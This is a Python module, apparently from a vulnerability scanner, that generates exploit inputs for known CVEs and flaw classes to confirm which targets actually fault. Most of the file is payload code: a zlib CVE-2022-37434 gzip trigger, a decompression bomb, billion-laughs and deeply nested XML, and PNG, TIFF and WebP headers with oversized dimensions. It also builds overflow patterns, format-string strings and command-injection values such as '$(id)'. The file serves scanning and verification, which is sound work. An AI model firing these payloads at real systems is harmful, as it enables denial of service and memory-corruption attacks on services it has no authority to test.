"""Per-CVE weaponization: concrete, parameterized triggers for specific known CVEs.

A version match says a component is KNOWN-vulnerable; a trigger turns that into an actual input
that exercises the flaw. These are hand-authored per CVE (there is no general recipe from a CVE
id to an exploit), registered by CVE id, and consumed by the `cve_poc` stage, which feeds the
trigger to a matched target and records a VERIFIED PoC only if the target actually faults -- so a
fixed/unaffected target is never falsely flagged.

Each trigger returns a Trigger: the input bytes, how to feed them (stdin/arg/file/stdin-slow),
the CWE, and a human note. stdlib based.
"""
from __future__ import annotations

import struct
import zlib
from dataclasses import dataclass, field


@dataclass
class Trigger:
    cve: str
    data: bytes
    channel: str = "stdin"          # stdin | file | arg | stdin-slow (byte-dribble)
    cwe: str = "CWE-787"
    note: str = ""
    libraries: tuple = field(default_factory=tuple)   # which detected libs this applies to


def _cve_2022_37434(extra_len: int = 0x1000) -> Trigger:
    """zlib CVE-2022-37434: a heap buffer over-read/overflow in inflate() when a gzip header has
    an oversized EXTRA field (FEXTRA) and the application supplied a small `extra` buffer to
    inflateGetHeader(). Pre-1.2.12 inflate copies into head->extra past head->extra_max. The
    trigger is a gzip stream whose FEXTRA XLEN far exceeds any reasonable extra_max; feeding it a
    byte at a time (channel 'stdin-slow') maximises the chance the copy spans the boundary."""
    xlen = extra_len & 0xFFFF
    flg = 0x04                                   # FEXTRA
    hdr = b"\x1f\x8b\x08" + bytes([flg]) + b"\x00\x00\x00\x00" + b"\x00\xff"
    hdr += struct.pack("<H", xlen) + (b"A" * xlen)
    co = zlib.compressobj(9, zlib.DEFLATED, -15)  # raw deflate body (empty payload)
    body = co.compress(b"") + co.flush()
    trailer = struct.pack("<II", zlib.crc32(b"") & 0xFFFFFFFF, 0)
    data = hdr + body + trailer
    return Trigger(cve="CVE-2022-37434", data=data, channel="stdin-slow", cwe="CWE-787",
                   libraries=("zlib",),
                   note=("gzip stream with an oversized FEXTRA extra field; triggers the "
                         "inflate() out-of-bounds write in zlib < 1.2.12 when the app uses "
                         "inflateGetHeader() with a small extra buffer"))


def _zip_bomb(expand_gb: int = 8) -> Trigger:
    """A decompression bomb (CWE-409): a few KB of gzip that inflate to many GB. A consumer that
    buffers the output without a cap exhausts memory and is OOM-killed. Streamed through the
    compressor so building it never holds the expanded data."""
    co = zlib.compressobj(9, zlib.DEFLATED, 15 + 16)   # gzip container
    chunk = b"\x00" * (1 << 20)
    out = bytearray()
    for _ in range(expand_gb * 1024):                  # expand_gb GiB of zeros, 1 MiB at a time
        out += co.compress(chunk)
    out += co.flush()
    return Trigger(cve="class:CWE-409", data=bytes(out), channel="stdin", cwe="CWE-409",
                   libraries=("zlib",),
                   note=f"decompression bomb (~{expand_gb} GiB expansion) -- DoS a consumer that "
                        f"inflates without an output cap")


def _xml_deep_nesting(depth: int = 60000) -> Trigger:
    """Deeply-nested XML elements (CWE-776, stack exhaustion): a recursive-descent parser recurses
    once per open tag, so tens of thousands of nested elements blow the stack and crash it. A
    DIFFERENT vector from entity expansion (billion-laughs) -- it trips parsers that cap entity
    amplification but not element depth. A crash (SIGSEGV from stack overflow) or an OOM/timeout
    under the tight cve_poc budget both count as the fault."""
    data = b'<?xml version="1.0"?>\n' + b"<a>" * depth + b"</a>" * depth
    return Trigger(cve="class:CWE-776", data=data, channel="file", cwe="CWE-776",
                   libraries=("expat", "libexpat", "libxml2", "expat2"),
                   note=f"{depth}-deep nested-element XML -- stack-exhaustion DoS of a recursive "
                        f"parser without a depth limit")


def _png_oversized_dims() -> Trigger:
    """libpng (CWE-190): a structurally-valid PNG whose IHDR declares 0x7FFFFFFF x 0x7FFFFFFF at
    16-bit RGBA. A consumer that computes rowbytes = width*channels*bitdepth/8 and allocates
    height rows integer-overflows the size on a 32-bit size_t (undersized alloc -> heap overflow)
    or attempts a vast allocation. A random blob would fail PNG validation immediately; a valid
    header reaches the size arithmetic. Recorded only on a real fault, so a decoder that bounds
    image dimensions is never flagged."""
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", 0x7FFFFFFF, 0x7FFFFFFF, 16, 6, 0, 0, 0)   # 16-bit RGBA
    chunk = b"IHDR" + ihdr
    png = sig + struct.pack(">I", len(ihdr)) + chunk + struct.pack(">I", zlib.crc32(chunk) & 0xFFFFFFFF)
    png += struct.pack(">I", 0) + b"IEND" + struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
    return Trigger(cve="class:CWE-190", data=png, channel="file", cwe="CWE-190",
                   libraries=("libpng", "png"),
                   note="PNG IHDR with 0x7FFFFFFF dimensions -- integer-overflow / huge-alloc in a "
                        "libpng consumer that does not bound image size")


def _tiff_oversized_dims() -> Trigger:
    """libtiff (CWE-190/-787): a structurally-valid little-endian TIFF whose ImageWidth/ImageLength
    are 0x7FFFFFFF. A reader that computes a scanline/strip buffer from width*height*bpp overflows
    the size on 32-bit arithmetic (undersized alloc -> heap overflow) or attempts a vast allocation.
    A random blob fails TIFF validation immediately; a valid IFD reaches the size math. Recorded
    only on a real fault, so a reader that bounds image dimensions is never flagged."""
    def ifd_entry(tag, typ, val):                    # 12-byte IFD entry: tag,type,count=1,value
        return struct.pack("<HHII", tag, typ, 1, val)
    entries = [ifd_entry(0x0100, 4, 0x7FFFFFFF),      # ImageWidth  (LONG)
               ifd_entry(0x0101, 4, 0x7FFFFFFF),      # ImageLength (LONG)
               ifd_entry(0x0102, 3, 8),               # BitsPerSample
               ifd_entry(0x0106, 3, 1),               # PhotometricInterpretation
               ifd_entry(0x0111, 4, 8)]               # StripOffsets
    ifd_off = 8
    ifd = struct.pack("<H", len(entries)) + b"".join(entries) + struct.pack("<I", 0)
    data = b"II" + struct.pack("<HI", 42, ifd_off) + ifd
    return Trigger(cve="class:CWE-190", data=data, channel="file", cwe="CWE-190",
                   libraries=("libtiff", "tiff"),
                   note="TIFF IFD declaring 0x7FFFFFFF x 0x7FFFFFFF -- integer-overflow / huge-alloc "
                        "in a libtiff reader that does not bound image dimensions")


def _webp_oversized_dims() -> Trigger:
    """libwebp (CWE-787/-190): a RIFF/WEBP container with a lossless VP8L chunk whose 14-bit
    width/height fields are maxed (16383x16383). A decoder that allocates the ARGB canvas from the
    declared dimensions without a cap over-allocates or overflows the size math -- the class of flaw
    behind the libwebp VP8L heap overflow. A random blob fails the RIFF/VP8L validation; a valid
    header reaches the allocation. Recorded only on a real fault, so a bounded decoder is not
    flagged."""
    # VP8L bitstream head: a 0x2f signature byte, then (LSB-first) width-1 (14 bits), height-1
    # (14 bits), alpha (1), version (3) -- the 28 dim bits occupy the four bytes AFTER the signature.
    w = h = 0x3FFF                                    # width-1 = height-1 = 16383  -> 16384 px each
    dims = (w | (h << 14)) & 0xFFFFFFFF               # width-1 in bits 0..13, height-1 in bits 14..27
    vp8l = b"\x2f" + struct.pack("<I", dims) + b"\x00" * 8
    chunk = b"VP8L" + struct.pack("<I", len(vp8l)) + vp8l
    riff = b"RIFF" + struct.pack("<I", 4 + len(chunk)) + b"WEBP" + chunk
    return Trigger(cve="class:CWE-787", data=riff, channel="file", cwe="CWE-787",
                   libraries=("libwebp", "webp"),
                   note="WEBP/VP8L header declaring 16383x16383 -- over-allocation / size overflow "
                        "in a libwebp decoder without a dimension cap (the VP8L heap-overflow class)")


def _billion_laughs() -> Trigger:
    """XML entity-expansion DoS (CWE-776 'billion laughs'): nested entities expand to billions of
    characters, exhausting memory in a parser without an amplification limit. Modern expat/libxml2
    resist by default -- cve_poc records a result only on a real fault, so a protected parser is
    simply not flagged."""
    lines = ['<?xml version="1.0"?>', '<!DOCTYPE lolz [', ' <!ENTITY lol "lol">']
    for i in range(1, 10):
        prev = "lol" if i == 1 else f"lol{i - 1}"
        lines.append(f' <!ENTITY lol{i} "{("&" + prev + ";") * 10}">')
    lines.append(']>')
    lines.append('<lolz>&lol9;</lolz>')
    return Trigger(cve="class:CWE-776", data=("\n".join(lines)).encode(), channel="file",
                   cwe="CWE-776", libraries=("expat", "libexpat", "libxml2", "expat2"),
                   note="billion-laughs XML entity expansion -- DoS an XML parser without an "
                        "amplification limit")


# CVE id -> trigger factory. Add entries here to weaponize more version-matched CVEs.
_TRIGGERS = {
    "CVE-2022-37434": _cve_2022_37434,
}

# library name -> trigger factories that apply to ANY matched CVE of that library (format-level
# attacks a version match implies, independent of the specific CVE).
_LIBRARY_TRIGGERS = {
    "zlib": [_zip_bomb],
    "expat": [_billion_laughs, _xml_deep_nesting],
    "libexpat": [_billion_laughs, _xml_deep_nesting],
    "expat2": [_billion_laughs, _xml_deep_nesting],
    "libxml2": [_billion_laughs, _xml_deep_nesting],
    "libpng": [_png_oversized_dims],
    "png": [_png_oversized_dims],
    "libtiff": [_tiff_oversized_dims],
    "tiff": [_tiff_oversized_dims],
    "libwebp": [_webp_oversized_dims],
    "webp": [_webp_oversized_dims],
}


def library_triggers(library: str) -> list:
    """Format-level Triggers that apply to any matched CVE of a given library."""
    return [fn() for fn in _LIBRARY_TRIGGERS.get((library or "").lower(), [])]


def for_cve(cve: str):
    """The hand-authored Trigger for a CVE id, or None when none is authored."""
    fn = _TRIGGERS.get((cve or "").upper())
    return fn() if fn else None


def available() -> set:
    return set(_TRIGGERS)


# ------------------------------------------------------------- generic CWE-class weaponization
# When a matched CVE has no bespoke trigger, its CWE still says WHAT KIND of flaw it is, which
# gives a best-effort input to try: a long cyclic payload for a buffer overflow, format
# specifiers for a format-string bug, shell metacharacters for a command injection. These are
# attempts, not guaranteed reproducers -- cve_poc records a result only if the target actually
# faults -- but they weaponize far more matched CVEs than hand-authoring alone.
def _cyclic(n: int) -> bytes:
    """A de Bruijn-ish cyclic pattern so a smashed return address is recognisable in a dump."""
    out = bytearray()
    a, b, c = 0x41, 0x61, 0x30
    while len(out) < n:
        out += bytes([a, b, c, 0x2e])
        c += 1
        if c > 0x39:
            c = 0x30; b += 1
        if b > 0x7a:
            b = 0x61; a += 1
    return bytes(out[:n])


_OVERFLOW_CWES = {"CWE-787", "CWE-121", "CWE-120", "CWE-119", "CWE-122", "CWE-125", "CWE-124",
                  "CWE-190", "CWE-131", "CWE-416", "CWE-788", "CWE-126"}
_FMT_CWES = {"CWE-134"}
_CMDI_CWES = {"CWE-78", "CWE-77"}
# Uncontrolled recursion / stack exhaustion: a recursive-descent parser that recurses per nesting
# level crashes (SIGSEGV) or hangs on a pathologically deep input. Bracket/paren/brace runs probe
# the common cases (JSON, expression and config parsers) without needing a specific grammar.
_RECURSION_CWES = {"CWE-674", "CWE-776"}


@dataclass
class PlanItem:
    label: str                      # human label for the recorded finding
    trigger: Trigger
    confidence: float
    group: str = ""                 # "" = always try; else stop at first fault within the group


def weaponization_plan(matched) -> list:
    """The ordered weaponization steps for a target's version-matched CVEs, as PlanItems. PURE
    (no detonation), so the selection -- which is the whole CVE->exploit chain -- is unit-testable
    independent of a live target.

    `matched` is an iterable of (cve_id, library, cwe). The plan is, in fidelity order:
      1. hand-authored CVE-specific triggers (confidence 0.95, always tried)
      2. library-level format triggers per distinct matched library (0.85) -- e.g. a zlib bomb or
         XML billion-laughs; the version match alone implies these format-level attacks
      3. generic CWE-class triggers per distinct CWE, for CVEs WITHOUT a bespoke trigger (0.80)
    Steps 2 and 3 carry a `group` so the stage records one reproduction per library / per CWE
    (the first that faults) rather than every payload. A fixed/unaffected target simply never
    faults and is never flagged -- the plan is attempts, the stage records only real faults."""
    matched = [(str(c or "").upper(), (lib or "").lower(), (cwe or "").upper())
               for c, lib, cwe in matched]
    plan: list = []
    # 1) bespoke, CVE-specific
    for cve, _lib, _cwe in matched:
        trig = for_cve(cve)
        if trig is not None:
            plan.append(PlanItem(cve, trig, 0.95))
    # 2) library-level, once per distinct library
    seen_lib = set()
    for cve, lib, _cwe in matched:
        if not lib or lib in seen_lib:
            continue
        seen_lib.add(lib)
        for trig in library_triggers(lib):
            plan.append(PlanItem(f"{cve} ({lib} {trig.cwe})", trig, 0.85, group=f"lib:{lib}"))
    # 3) CWE-class, once per distinct CWE, for CVEs with no bespoke trigger
    seen_cwe = set()
    for cve, _lib, cwe in matched:
        if for_cve(cve) is not None or not cwe or cwe in seen_cwe:
            continue
        seen_cwe.add(cwe)
        for trig in class_triggers(cwe):
            plan.append(PlanItem(f"{cve} ({cwe} class)", trig, 0.80, group=f"cwe:{cwe}"))
    return plan


def class_triggers(cwe: str) -> list:
    """Best-effort Triggers implied by a CWE class (no specific CVE needed). Fed over stdin/file/
    arg; recorded only on a real fault."""
    cwe = (cwe or "").upper()
    out = []
    if cwe in _OVERFLOW_CWES:
        for n in (256, 1024, 4096, 16384):
            for ch in ("stdin", "file", "arg"):
                out.append(Trigger(cve=f"class:{cwe}", data=_cyclic(n), channel=ch, cwe=cwe,
                                   note=f"generic overflow probe ({n}B cyclic) for {cwe}"))
    elif cwe in _FMT_CWES:
        for pat in (b"%n%n%n%n%n%n%n%n", b"%p" * 32, b"%s%s%s%s%s%s", b"%99999$n"):
            for ch in ("stdin", "arg", "file"):
                out.append(Trigger(cve=f"class:{cwe}", data=pat, channel=ch, cwe=cwe,
                                   note=f"generic format-string probe for {cwe}"))
    elif cwe in _CMDI_CWES:
        for pat in (b";id\n", b"`id`", b"$(id)", b"| id", b"&& id"):
            for ch in ("arg", "stdin", "file"):
                out.append(Trigger(cve=f"class:{cwe}", data=pat, channel=ch, cwe=cwe,
                                   note=f"generic command-injection probe for {cwe}"))
    elif cwe in _RECURSION_CWES:
        for opener in (b"[", b"(", b"{", b"<a>"):
            for n in (50000, 200000):
                for ch in ("stdin", "file"):
                    out.append(Trigger(cve=f"class:{cwe}", data=opener * n, channel=ch, cwe=cwe,
                                       note=f"deep-recursion probe ({n}x {opener!r}) for {cwe}"))
    return out
